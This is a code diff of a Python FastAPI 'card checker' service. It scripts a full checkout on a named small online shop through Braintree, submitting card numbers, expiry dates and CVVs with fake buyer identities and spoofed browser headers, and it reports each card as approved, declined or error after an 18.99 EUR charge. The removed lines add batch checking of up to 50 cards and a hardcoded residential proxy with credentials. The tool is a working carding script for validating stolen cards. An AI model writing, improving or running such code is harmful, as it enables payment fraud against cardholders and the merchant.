@@ -1,72 +1,80 @@
 from fastapi import FastAPI, HTTPException
 from pydantic import BaseModel
-import asyncio
-import aiohttp
-import base64
-import datetime
-import json
+import requests
 import re
-import uuid
-from bs4 import BeautifulSoup, Tag
 from fake_useragent import FakeUserAgent
 from faker import Faker
-from typing import Optional, List
+from bs4 import BeautifulSoup
+import base64
+import json
+import uuid
+import datetime
 import os
+from typing import Optional
 
 app = FastAPI(title="Braintree Card Checker API", version="1.0.0")
-
-# Configuración de proxy desde variable de entorno
-PROXY = 'resi.legionproxy.io:9595:vUdAfD9RPXV8j2dX-res-any:MtsnNTSFWKsZoxJ4'  # Format: proxy:port:username:password
 
 class CardRequest(BaseModel):
     card: str
 
-class CardBatchRequest(BaseModel):
-    cards: List[str]
-
 class CardResponse(BaseModel):
-    card: str
     status: str
     message: str
+    card_info: dict = None
     tds_status: Optional[str] = None
     enrolled: Optional[str] = None
-    error: Optional[str] = None
+
+def splitter(text: str, start: str, end: str) -> str:
+    try:
+        start_index = text.index(start) + len(start)
+        end_index = text.index(end, start_index)
+        return text[start_index:end_index]
+    except ValueError:
+        return ""
 
 def parse_card(card: str):
+    parts = re.split(r"\D+", card.strip())[:4]
+    if len(parts) < 4:
+        return "Invalid length (4 parts needed)."
     try:
-        card_number, exp_month, exp_year, cvv = re.findall(r"\d+", card)[:4]
-        return card_number, exp_month, exp_year, cvv
-    except IndexError:
-        raise ValueError(
-            "Card format is incorrect. Expected format: card_number, exp_month, exp_year, cvv"
-        )
+        num, month, year, cvv = map(str, parts)
+        month_str = month.zfill(2)
+        year_str = year
+        if len(year_str) == 2:
+            year_str = str(2000 + int(year))
+        return (num, month_str, year_str, cvv)
+    except ValueError:
+        return "Invalid card format."
 
-async def get_ip_address() -> str:
-    timeout = aiohttp.ClientTimeout(total=30)
+def card_type(card_num):
+    num = "".join(filter(str.isdigit, str(card_num)))
+    if num[0] == "4":
+        return "VISA"
+    elif num[0] == "5":
+        return "MasterCard"
+    elif num[:2] in ["34", "37"]:
+        return "AMEX"
+    elif num[:4] == "6011" or num[:2] == "65":
+        return "DISCOVER"
+    else:
+        return "CARD TYPE"
+
+def get_ip_address():
     try:
-        async with aiohttp.ClientSession(timeout=timeout) as session:
-            headers = {
-                "accept": "application/json",
-                "user-agent": FakeUserAgent(os=["Windows"]).chrome,
-            }
-            async with session.get("https://api.ipify.org?format=json", headers=headers) as resp:
-                if resp.status == 200:
-                    data = await resp.json()
-                    return data.get("ip", "")
-                else:
-                    print(f"[ERROR] Failed to get IP address: {resp.status}")
-                    return ""
+        resp = requests.get("https://api.ipify.org?format=json", timeout=30)
+        if resp.status_code == 200:
+            return resp.json().get("ip", "")
+        else:
+            print(f"[ERROR] Failed to get IP address: {resp.status_code}")
+            return ""
     except Exception as e:
         print(f"[ERROR] Failed to get IP address: {e}")
         return ""
 
-async def braintree_18_99_eur(card: str):
-    try:
-        card_number, exp_month, exp_year, cvv = parse_card(card)
-    except ValueError as e:
-        return "error", str(e), None, None
-
-    user_agent = FakeUserAgent(os=["Windows"]).chrome
+def braintree_payment(card_data):
+    card_num, card_mm, card_yy, card_cvv = card_data
+    
+    user_agent = str(FakeUserAgent(os=["Windows"]).chrome)
     fake_us = Faker(locale="en_US")
     first_name = fake_us.first_name()
     last_name = fake_us.last_name()
@@ -83,39 +91,22 @@ async def braintree_18_99_eur(card: str):
     city_es = "Barcelona"
     zip_code_es = fake_es.numerify("11###")
 
-    req_num = 0
     session_id = str(uuid.uuid4())
     reference_id = str(uuid.uuid4())
     start_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    ip_address = await get_ip_address()
+    ip_address = get_ip_address()
     if not ip_address:
-        return "error", "Could not retrieve IP address", None, None
+        return "error", "Could not retrieve IP address"
 
-    timeout = aiohttp.ClientTimeout(total=60)
-    connector_kwargs = {}
-    
-    if PROXY:
-        try:
-            proxy_parts = PROXY.split(":")
-            if len(proxy_parts) == 4:
-                proxy, port, username, password = proxy_parts
-                proxy_url = f"http://{username}:{password}@{proxy}:{port}"
-                connector_kwargs["proxy"] = proxy_url
-        except Exception as e:
-            print(f"[ERROR] Proxy configuration error: {e}")
+    session = requests.Session()
+    session.headers.update({'User-Agent': user_agent})
 
-    connector = aiohttp.TCPConnector(**connector_kwargs)
-    
-    async with aiohttp.ClientSession(
-        timeout=timeout,
-        connector=connector,
-        headers={"user-agent": user_agent}
-    ) as session:
-        try:
-            # REQ 1: POST to admin-ajax.php
-            req_num = 1
-            headers = {
+    try:
+        # REQ 1: POST to admin-ajax.php
+        resp = session.post(
+            "https://nammanmuay.eu/wp-admin/admin-ajax.php",
+            headers={
                 "accept": "*/*",
                 "accept-encoding": "gzip, deflate",
                 "accept-language": "en-US,en;q=0.9",
@@ -125,26 +116,23 @@ async def braintree_18_99_eur(card: str):
                 "pragma": "no-cache",
                 "referer": "https://nammanmuay.eu/namman-muay-cream-100g/",
                 "x-requested-with": "XMLHttpRequest",
-            }
-            
-            data = {
+            },
+            data={
                 "quantity": "1",
                 "add-to-cart": "623",
                 "action": "ouwoo_ajax_add_to_cart",
                 "variation_id": "0",
-            }
+            },
+            timeout=60
+        )
 
-            async with session.post(
-                "https://nammanmuay.eu/wp-admin/admin-ajax.php",
-                headers=headers,
-                data=data
-            ) as resp:
-                if resp.status != 200:
-                    return "error", f"Request {req_num} failed with status code: {resp.status}", None, None
+        if resp.status_code != 200:
+            return "error", f"Request 1 failed with status code: {resp.status_code}"
 
-            # REQ 2: GET to checkout
-            req_num = 2
-            headers = {
+        # REQ 2: GET to checkout
+        resp = session.get(
+            "https://nammanmuay.eu/checkout/",
+            headers={
                 "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                 "accept-encoding": "gzip, deflate",
                 "accept-language": "en-US,en;q=0.9",
@@ -152,45 +140,42 @@ async def braintree_18_99_eur(card: str):
                 "pragma": "no-cache",
                 "referer": "https://nammanmuay.eu/namman-muay-cream-100g/",
                 "upgrade-insecure-requests": "1",
-            }
+            },
+            timeout=60
+        )
 
-            async with session.get(
-                "https://nammanmuay.eu/checkout/",
-                headers=headers
-            ) as resp:
-                if resp.status != 200:
-                    return "error", f"Request {req_num} failed with status code: {resp.status}", None, None
-                
-                html_content = await resp.text()
+        if resp.status_code != 200:
+            return "error", f"Request 2 failed with status code: {resp.status_code}"
 
-            soup = BeautifulSoup(html_content, "html.parser")
-            script_tag = soup.find("script", string=re.compile(r"wc_braintree_client_token"))
-            
-            if not script_tag:
-                return "error", "Script with 'wc_braintree_client_token' not found", None, None
+        soup = BeautifulSoup(resp.text, "html.parser")
+        script_tag = soup.find("script", string=re.compile(r"wc_braintree_client_token"))
+        
+        if not script_tag:
+            return "error", "Script with 'wc_braintree_client_token' not found"
 
-            script_content = script_tag.get_text()
-            match = re.search(r"wc_braintree_client_token\s*=\s*\"(.*?)\"", script_content, re.DOTALL)
-            
-            if not match:
-                return "error", "Variable 'wc_braintree_client_token' not found", None, None
+        script_content = script_tag.get_text()
+        match = re.search(r"wc_braintree_client_token\s*=\s*\"(.*?)\"", script_content, re.DOTALL)
+        
+        if not match:
+            return "error", "Variable 'wc_braintree_client_token' not found"
 
-            client_token = match.group(1).strip()
-            try:
-                decoded_token = json.loads(base64.b64decode(client_token).decode("utf-8"))
-                authorization_fingerprint = decoded_token.get("authorizationFingerprint")
-            except Exception as e:
-                return "error", f"Failed to decode client token: {str(e)}", None, None
+        client_token = match.group(1).strip()
+        try:
+            decoded_token = json.loads(base64.b64decode(client_token).decode("utf-8"))
+            authorization_fingerprint = decoded_token.get("authorizationFingerprint")
+        except Exception as e:
+            return "error", f"Failed to decode client token: {str(e)}"
 
-            input_tag = soup.find("input", id="woocommerce-process-checkout-nonce")
-            if input_tag and isinstance(input_tag, Tag):
-                checkout_nonce = input_tag.get("value")
-            else:
-                return "error", "Checkout nonce not found", None, None
+        input_tag = soup.find("input", id="woocommerce-process-checkout-nonce")
+        if input_tag:
+            checkout_nonce = input_tag.get("value")
+        else:
+            return "error", "Checkout nonce not found"
 
-            # REQ 3: POST to graphql to get cardinalAuthenticationJWT
-            req_num = 3
-            headers = {
+        # REQ 3: POST to graphql to get cardinalAuthenticationJWT
+        resp = session.post(
+            "https://payments.braintree-api.com/graphql",
+            headers={
                 "accept": "*/*",
                 "accept-encoding": "gzip, deflate",
                 "accept-language": "en-US,en;q=0.9",
@@ -201,41 +186,49 @@ async def braintree_18_99_eur(card: str):
                 "origin": "https://assets.braintreegateway.com",
                 "pragma": "no-cache",
                 "referer": "https://assets.braintreegateway.com/",
-            }
-
-            payload = {
+            },
+            json={
                 "clientSdkMetadata": {
                     "source": "client",
                     "integration": "custom",
                     "sessionId": session_id,
                 },
                 "query": "query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT         cardinalSongbirdUrl         cardinalSongbirdIdentityHash       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     fastlane {       enabled       tokensOnDemand {         enabled         tokenExchange {           enabled         }       }     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }",
-            }
+            },
+            timeout=60
+        )
 
-            async with session.post(
-                "https://payments.braintree-api.com/graphql",
-                headers=headers,
-                json=payload
-            ) as resp:
-                if resp.status != 200:
-                    return "error", f"Request {req_num} failed with status code: {resp.status}", None, None
-                
-                resp_json = await resp.json()
+        if resp.status_code != 200:
+            return "error", f"Request 3 failed with status code: {resp.status_code}"
 
-            try:
-                cardinal_jwt = (
-                    resp_json.get("data", {})
-                    .get("clientConfiguration", {})
-                    .get("creditCard", {})
-                    .get("threeDSecure", {})
-                    .get("cardinalAuthenticationJWT")
-                )
-            except Exception:
-                cardinal_jwt = None
+        resp_json = resp.json()
+        try:
+            cardinal_jwt = (
+                resp_json.get("data", {})
+                .get("clientConfiguration", {})
+                .get("creditCard", {})
+                .get("threeDSecure", {})
+                .get("cardinalAuthenticationJWT")
+            )
+        except Exception:
+            cardinal_jwt = None
 
-            # REQ 4: POST to graphql to get tokenized credit card
-            req_num = 4
-            payload = {
+        # REQ 4: POST to graphql to get tokenized credit card
+        resp = session.post(
+            "https://payments.braintree-api.com/graphql",
+            headers={
+                "accept": "*/*",
+                "accept-encoding": "gzip, deflate",
+                "accept-language": "en-US,en;q=0.9",
+                "authorization": f"Bearer {authorization_fingerprint}",
+                "braintree-version": "2018-05-10",
+                "cache-control": "no-cache",
+                "content-type": "application/json",
+                "origin": "https://assets.braintreegateway.com",
+                "pragma": "no-cache",
+                "referer": "https://assets.braintreegateway.com/",
+            },
+            json={
                 "clientSdkMetadata": {
                     "source": "client",
                     "integration": "custom",
@@ -245,12 +238,12 @@ async def braintree_18_99_eur(card: str):
                 "variables": {
                     "input": {
                         "creditCard": {
-                            "number": card_number,
-                            "expirationMonth": exp_month.zfill(2),
+                            "number": card_num,
+                            "expirationMonth": card_mm.zfill(2),
                             "expirationYear": (
-                                "20" + exp_year if len(exp_year) == 2 else exp_year
+                                "20" + card_yy if len(card_yy) == 2 else card_yy
                             ),
-                            "cvv": cvv,
+                            "cvv": card_cvv,
                             "billingAddress": {
                                 "postalCode": zip_code,
                                 "streetAddress": street_address,
@@ -260,29 +253,26 @@ async def braintree_18_99_eur(card: str):
                     }
                 },
                 "operationName": "TokenizeCreditCard",
-            }
+            },
+            timeout=60
+        )
 
-            async with session.post(
-                "https://payments.braintree-api.com/graphql",
-                headers=headers,
-                json=payload
-            ) as resp:
-                if resp.status != 200:
-                    return "error", f"Request {req_num} failed with status code: {resp.status}", None, None
-                
-                resp_json = await resp.json()
+        if resp.status_code != 200:
+            return "error", f"Request 4 failed with status code: {resp.status_code}"
 
-            try:
-                token = resp_json.get("data", {}).get("tokenizeCreditCard", {}).get("token")
-            except Exception:
-                token = None
+        resp_json = resp.json()
+        try:
+            token = resp_json.get("data", {}).get("tokenizeCreditCard", {}).get("token")
+        except Exception:
+            token = None
 
-            if not token:
-                return "error", "Failed to get token", None, None
+        if not token:
+            return "error", "Failed to get token"
 
-            # REQ 5: POST to lookup
-            req_num = 5
-            headers = {
+        # REQ 5: POST to lookup
+        resp = session.post(
+            f"https://api.braintreegateway.com/merchants/vb72b9cm2v6gskzz/client_api/v1/payment_methods/{token}/three_d_secure/lookup",
+            headers={
                 "accept": "*/*",
                 "accept-encoding": "gzip, deflate",
                 "accept-language": "en-US,en;q=0.9",
@@ -291,9 +281,8 @@ async def braintree_18_99_eur(card: str):
                 "origin": "https://nammanmuay.eu",
                 "pragma": "no-cache",
                 "referer": "https://nammanmuay.eu/",
-            }
-
-            payload = {
+            },
+            json={
                 "amount": "18.99",
                 "browserColorDepth": 24,
                 "browserJavaEnabled": False,
@@ -324,7 +313,7 @@ async def braintree_18_99_eur(card: str):
                     "shippingCountryCode": "ES",
                     "email": email,
                 },
-                "bin": card_number[:6],
+                "bin": card_num[:6],
                 "dfReferenceId": f"0_{reference_id}",
                 "clientMetadata": {
                     "requestedThreeDSecureVersion": "2",
@@ -344,36 +333,33 @@ async def braintree_18_99_eur(card: str):
                     "integrationType": "custom",
                     "sessionId": session_id,
                 },
-            }
+            },
+            timeout=60
+        )
 
-            async with session.post(
-                f"https://api.braintreegateway.com/merchants/vb72b9cm2v6gskzz/client_api/v1/payment_methods/{token}/three_d_secure/lookup",
-                headers=headers,
-                json=payload
-            ) as resp:
-                if resp.status != 200:
-                    return "error", f"Request {req_num} failed with status code: {resp.status}", None, None
-                
-                resp_json = await resp.json()
+        if resp.status_code != 200:
+            return "error", f"Request 5 failed with status code: {resp.status_code}"
 
-            try:
-                nonce = resp_json.get("paymentMethod", {}).get("nonce")
-                status = (
-                    resp_json.get("paymentMethod", {})
-                    .get("threeDSecureInfo", {})
-                    .get("status")
-                )
-                enrolled = (
-                    resp_json.get("paymentMethod", {})
-                    .get("threeDSecureInfo", {})
-                    .get("enrolled")
-                )
-            except Exception:
-                return "error", "Failed to parse 3D Secure info", None, None
+        resp_json = resp.json()
+        try:
+            nonce = resp_json.get("paymentMethod", {}).get("nonce")
+            status = (
+                resp_json.get("paymentMethod", {})
+                .get("threeDSecureInfo", {})
+                .get("status")
+            )
+            enrolled = (
+                resp_json.get("paymentMethod", {})
+                .get("threeDSecureInfo", {})
+                .get("enrolled")
+            )
+        except Exception:
+            return "error", "Failed to parse 3D Secure info"
 
-            # REQ 6: POST to get cart id
-            req_num = 6
-            headers = {
+        # REQ 6: POST to get cart id
+        resp = session.post(
+            "https://nammanmuay.eu/?wc-ajax=bwfan_insert_abandoned_cart&wfacp_id=54599&wfacp_is_checkout_override=yes",
+            headers={
                 "accept": "*/*",
                 "accept-encoding": "gzip, deflate",
                 "accept-language": "en-US,en;q=0.9",
@@ -383,9 +369,8 @@ async def braintree_18_99_eur(card: str):
                 "pragma": "no-cache",
                 "referer": "https://nammanmuay.eu/checkout/",
                 "x-requested-with": "XMLHttpRequest",
-            }
-
-            data = {
+            },
+            data={
                 "email": email,
                 "action": "bwfan_insert_abandoned_cart",
                 "checkout_fields_data[shipping_same_as_billing]": "1",
@@ -414,25 +399,22 @@ async def braintree_18_99_eur(card: str):
                 "aerocheckout_page_id": "54599",
                 "pushengage_token": "",
                 "_wpnonce": "a8f2caf831",
-            }
+            },
+            timeout=60
+        )
 
-            async with session.post(
-                "https://nammanmuay.eu/?wc-ajax=bwfan_insert_abandoned_cart&wfacp_id=54599&wfacp_is_checkout_override=yes",
-                headers=headers,
-                data=data
-            ) as resp:
-                if resp.status != 200:
-                    return "error", f"Request {req_num} failed with status code: {resp.status}", None, None
-                
-                try:
-                    resp_json = await resp.json()
-                    cart_id = resp_json.get("id")
-                except Exception:
-                    cart_id = None
+        if resp.status_code != 200:
+            return "error", f"Request 6 failed with status code: {resp.status_code}"
 
-            # REQ 7: POST to checkout (final request)
-            req_num = 7
-            headers = {
+        try:
+            cart_id = resp.json().get("id")
+        except Exception:
+            cart_id = None
+
+        # REQ 7: POST to checkout (final request)
+        resp = session.post(
+            "https://nammanmuay.eu/?wc-ajax=checkout&wfacp_id=54599&wfacp_is_checkout_override=yes",
+            headers={
                 "accept": "application/json, text/javascript, */*; q=0.01",
                 "accept-encoding": "gzip, deflate",
                 "accept-language": "en-US,en;q=0.9",
@@ -442,9 +424,8 @@ async def braintree_18_99_eur(card: str):
                 "pragma": "no-cache",
                 "referer": "https://nammanmuay.eu/checkout/",
                 "x-requested-with": "XMLHttpRequest",
-            }
-
-            data = {
+            },
+            data={
                 "_wfacp_post_id": "54599",
                 "wfacp_cart_hash": "",
                 "wfacp_has_active_multi_checkout": "",
@@ -508,135 +489,94 @@ async def braintree_18_99_eur(card: str):
                 "billing_state": "",
                 "shipping_state": "",
                 "ship_to_different_address": "1",
-            }
+            },
+            timeout=60
+        )
 
-            async with session.post(
-                "https://nammanmuay.eu/?wc-ajax=checkout&wfacp_id=54599&wfacp_is_checkout_override=yes",
-                headers=headers,
-                data=data
-            ) as resp:
-                if resp.status != 200:
-                    return "error", f"Request {req_num} failed with status code: {resp.status}", None, None
-                
-                try:
-                    resp_json = await resp.json()
-                except Exception:
-                    return "error", "Invalid JSON response from checkout", None, None
-                
-                if resp_json.get("result") == "success":
-                    return "approved", "Charged 18,99€", status, enrolled
+        if resp.status_code != 200:
+            return "error", f"Request 7 failed with status code: {resp.status_code}"
 
-                message = resp_json.get("messages", "")
-                soup = BeautifulSoup(message, "html.parser")
-                text = soup.get_text()
-                match = re.search(r"Reason:\s*(.*)", text)
-                error_reason = match.group(1) if match else "Unknown error"
+        try:
+            resp_json = resp.json()
+        except Exception:
+            return "error", "Invalid JSON response from checkout"
+        
+        if resp_json.get("result") == "success":
+            return "approved", "Charged 18,99€", status, enrolled
 
-                return "declined", error_reason, status, enrolled
+        message = resp_json.get("messages", "")
+        soup = BeautifulSoup(message, "html.parser")
+        text = soup.get_text()
+        match = re.search(r"Reason:\s*(.*)", text)
+        error_reason = match.group(1) if match else "Unknown error"
 
-        except Exception as e:
-            return "error", f"Request {req_num} failed: {str(e)}", None, None
+        return "declined", error_reason, status, enrolled
+
+    except Exception as e:
+        return "error", f"Processing failed: {str(e)}"
 
 @app.get("/")
-async def root():
+def root():
     return {
         "message": "Braintree Card Checker API", 
         "version": "1.0.0",
-        "status": "online",
+        "status": "running",
         "endpoints": {
-            "check_single_card": "/check-card",
-            "check_multiple_cards": "/check-cards",
+            "check_card": "/check-card",
             "health": "/health",
             "docs": "/docs"
         }
     }
 
-@app.post("/check-card", response_model=CardResponse)
-async def check_card(request: CardRequest):
-    """
-    Check a single credit card
-    """
-    try:
-        result = await braintree_18_99_eur(request.card)
-        
-        if result is None or len(result) != 4:
-            raise HTTPException(status_code=500, detail="Invalid result from card checker")
-        
-        status, message, tds_status, enrolled = result
-        
-        return CardResponse(
-            card=request.card,
-            status=status,
-            message=message,
-            tds_status=tds_status,
-            enrolled=enrolled
-        )
-    
-    except ValueError as e:
-        raise HTTPException(status_code=400, detail=str(e))
-    except Exception as e:
-        raise HTTPException(status_code=500, detail=f"Internal server error: {str(e)}")
-
-@app.post("/check-cards", response_model=List[CardResponse])
-async def check_cards(request: CardBatchRequest):
-    """
-    Check multiple credit cards in batch
-    """
-    if len(request.cards) > 50:  # Limit batch size
-        raise HTTPException(status_code=400, detail="Maximum 50 cards per batch")
-    
-    results = []
-    
-    for card in request.cards:
-        try:
-            result = await braintree_18_99_eur(card)
-            
-            if result is None or len(result) != 4:
-                results.append(CardResponse(
-                    card=card,
-                    status="error",
-                    message="Invalid result from card checker",
-                    error="Processing error"
-                ))
-                continue
-            
-            status, message, tds_status, enrolled = result
-            
-            results.append(CardResponse(
-                card=card,
-                status=status,
-                message=message,
-                tds_status=tds_status,
-                enrolled=enrolled
-            ))
-            
-        except ValueError as e:
-            results.append(CardResponse(
-                card=card,
-                status="error",
-                message=str(e),
-                error="Card format error"
-            ))
-        except Exception as e:
-            results.append(CardResponse(
-                card=card,
-                status="error",
-                message=f"Processing error: {str(e)}",
-                error="Internal error"
-            ))
-    
-    return results
-
 @app.get("/health")
-async def health_check():
-    """
-    Health check endpoint
-    """
+def health():
     return {
-        "status": "healthy", 
+        "status": "healthy",
         "timestamp": datetime.datetime.now().isoformat(),
         "service": "Braintree Card Checker API"
     }
+
+@app.post("/check-card", response_model=CardResponse)
+def check_card(request: CardRequest):
+    try:
+        card = parse_card(request.card)
+        if not isinstance(card, tuple):
+            raise HTTPException(status_code=400, detail=f"Card parsing error: {card}")
+
+        result = braintree_payment(card)
+
+        if len(result) == 4:
+            status, message, tds_status, enrolled = result
+            return CardResponse(
+                status=status,
+                message=message,
+                card_info={
+                    "card_number": card[0][:4] + "****" + card[0][-4:],
+                    "card_type": card_type(card[0]),
+                    "expiry": f"{card[1]}/{card[2]}"
+                },
+                tds_status=tds_status,
+                enrolled=enrolled
+            )
+        elif len(result) == 2:
+            status, message = result
+            return CardResponse(
+                status=status,
+                message=message,
+                card_info={
+                    "card_number": card[0][:4] + "****" + card[0][-4:],
+                    "card_type": card_type(card[0]),
+                    "expiry": f"{card[1]}/{card[2]}"
+                }
+            )
+        else:
+            return CardResponse(
+                status="Error",
+                message=str(result)
+            )
+
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=f"Internal server error: {str(e)}")
 
 if __name__ == "__main__":
     import uvicorn
